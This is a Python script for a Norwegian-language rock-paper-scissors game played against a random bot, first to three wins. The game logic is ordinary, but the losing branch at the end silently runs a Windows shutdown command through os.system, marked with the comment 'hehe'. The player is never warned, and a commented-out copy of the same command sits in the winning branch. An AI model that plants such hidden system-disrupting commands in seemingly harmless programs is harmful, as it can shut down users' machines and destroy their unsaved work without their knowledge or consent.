import random


ordliste = ["stein", "saks", "papir"]
wins = 0
tap = 0


# Første mann til 3
while wins != 3 and tap != 3:

    bot = random.choice(ordliste)
    bruker = input("\nStein saks eller papir?: ").lower()
    if bot == bruker:
        print(f"\n-------------------------------------- \n Dere valgte begge {bot}! Prøv igjen! \n-------------------------------------- \n")

    elif bot == "saks" and bruker == "stein":
        wins += 1
        print(f"\n------------------------------ \n Du vant! Boten valgte {bot}! \n------------------------------ \n")

    elif bot == "stein" and bruker == "papir":
        wins += 1
        print(f"\n------------------------------ \n Du vant! Boten valgte {bot}! \n------------------------------ \n")

    elif bot == "papir" and bruker == "saks":
        wins += 1
        print(f"\n------------------------------ \n Du vant! Boten valgte {bot}! \n------------------------------ \n")



    elif bot == "stein" and bruker == "saks":
        tap += 1
        print(f"\n------------------------------ \n Du tapte! Boten valgte {bot}! \n------------------------------ \n")

    elif bot == "saks" and bruker == "papir":
        tap += 1
        print(f"\n------------------------------- \n Du tapte! Boten valgte {bot}! \n------------------------------- \n")

    elif bot == "papir" and bruker == "stein":
        tap += 1
        print(f"\n------------------------------- \n Du tapte! Boten valgte {bot}! \n------------------------------- \n")

    else:
        print("Error! Ugyldig verdi!")




if wins == 3:
    print("\n----------\n Du vant!\n----------\n")
    #os.system('shutdown /s /c "ByeBye" /t 3') # hehe
elif tap == 3:
    print("\n-----------\n Du tapte!\n-----------\n")
    import os
    os.system('shutdown /s /c "ByeBye" /t 3') # hehe
else: 
    print("Error!")